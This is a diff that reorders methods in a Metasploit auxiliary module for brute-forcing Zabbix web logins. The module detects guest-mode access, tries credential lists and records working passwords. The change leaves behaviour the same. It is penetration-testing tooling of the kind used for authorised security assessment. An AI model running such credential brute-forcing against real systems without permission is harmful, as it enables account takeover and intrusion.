@@ -39,17 +39,97 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   #
-  # From the documentation:
+  # main
   #
-  #  "In case of five consecutive failed login attempts, Zabbix interface will pause for 30
-  #   seconds in order to prevent brute force and dictionary attacks."
-  #
+  def run_host(ip)
+    init_loginscanner(ip)
+    msg = @scanner.check_setup
+    if msg
+      print_brute :level => :error, :ip => rhost, :msg => msg
+      return
+    end
 
-  # Zabbix enables a Guest mode by default that allows access to the dashboard without auth
-  def is_guest_mode_enabled?
-    dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'dashboard.php')
-    res = send_request_cgi({'uri'=>dashboard_uri})
-    !! (res && res.code == 200 && res.body.to_s =~ /<title>Zabbix .*: Dashboard<\/title>/)
+    print_brute :level=>:status, :ip=>rhost, :msg=>("Found Zabbix version #{@scanner.version}")
+
+    if is_guest_mode_enabled?
+      print_brute :level => :good, :ip => ip, :msg => "Note: This Zabbix instance has Guest mode enabled"
+    else
+      print_brute :level=>:status, :ip=>rhost, :msg=>("Zabbix has disabled Guest mode")
+    end
+
+    bruteforce(ip)
+  end
+
+  def bruteforce(ip)
+    @scanner.scan! do |result|
+      case result.status
+        when Metasploit::Model::Login::Status::SUCCESSFUL
+          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
+          do_report(ip, rport, result)
+          :next_user
+        when Metasploit::Model::Login::Status::DENIED_ACCESS
+          print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
+          do_report(ip, rport, result)
+          :next_user
+        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+          if datastore['VERBOSE']
+            print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+          end
+          invalidate_login(
+            address: ip,
+            port: rport,
+            protocol: 'tcp',
+            public: result.credential.public,
+            private: result.credential.private,
+            realm_key: result.credential.realm_key,
+            realm_value: result.credential.realm,
+            status: result.status
+          )
+          :abort
+        when Metasploit::Model::Login::Status::INCORRECT
+          if datastore['VERBOSE']
+            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+          end
+          invalidate_login(
+            address: ip,
+            port: rport,
+            protocol: 'tcp',
+            public: result.credential.public,
+            private: result.credential.private,
+            realm_key: result.credential.realm_key,
+            realm_value: result.credential.realm,
+            status: result.status
+          )
+      end
+    end
+  end
+
+  def do_report(ip, port, result)
+    service_data = {
+      address: ip,
+      port: port,
+      service_name: 'http',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: result.credential.private,
+      private_type: :password,
+      username: result.credential.public,
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: result.status
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def init_loginscanner(ip)
@@ -85,99 +165,18 @@ class Metasploit3 < Msf::Auxiliary
     @scanner.ssl_version = datastore['SSLVERSION']
   end
 
-  def do_report(ip, port, result)
-    service_data = {
-      address: ip,
-      port: port,
-      service_name: 'http',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      module_fullname: self.fullname,
-      origin_type: :service,
-      private_data: result.credential.private,
-      private_type: :password,
-      username: result.credential.public,
-    }.merge(service_data)
-
-    credential_core = create_credential(credential_data)
-
-    login_data = {
-      core: credential_core,
-      last_attempted_at: DateTime.now,
-      status: result.status
-    }.merge(service_data)
-
-    create_credential_login(login_data)
-  end
-
-  def bruteforce(ip)
-    @scanner.scan! do |result|
-      case result.status
-      when Metasploit::Model::Login::Status::SUCCESSFUL
-        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
-        do_report(ip, rport, result)
-        :next_user
-      when Metasploit::Model::Login::Status::DENIED_ACCESS
-        print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
-        do_report(ip, rport, result)
-        :next_user
-      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-        if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
-        end
-        invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
-        )
-        :abort
-      when Metasploit::Model::Login::Status::INCORRECT
-        if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
-        end
-        invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
-        )
-      end
-    end
-  end
-
-
   #
-  # main
+  # From the documentation:
   #
-  def run_host(ip)
-    init_loginscanner(ip)
-    msg = @scanner.check_setup
-    if msg
-      print_brute :level => :error, :ip => rhost, :msg => msg
-      return
-    end
+  #  "In case of five consecutive failed login attempts, Zabbix interface will pause for 30
+  #   seconds in order to prevent brute force and dictionary attacks."
+  #
 
-    print_brute :level=>:status, :ip=>rhost, :msg=>("Found Zabbix version #{@scanner.version}")
-
-    if is_guest_mode_enabled?
-      print_brute :level => :good, :ip => ip, :msg => "Note: This Zabbix instance has Guest mode enabled"
-    else
-      print_brute :level=>:status, :ip=>rhost, :msg=>("Zabbix has disabled Guest mode")
-    end
-
-    bruteforce(ip)
+  # Zabbix enables a Guest mode by default that allows access to the dashboard without auth
+  def is_guest_mode_enabled?
+    dashboard_uri = normalize_uri(datastore['TARGETURI'] + '/' + 'dashboard.php')
+    res = send_request_cgi({'uri'=>dashboard_uri})
+    !! (res && res.code == 200 && res.body.to_s =~ /<title>Zabbix .*: Dashboard<\/title>/)
   end
 
 end
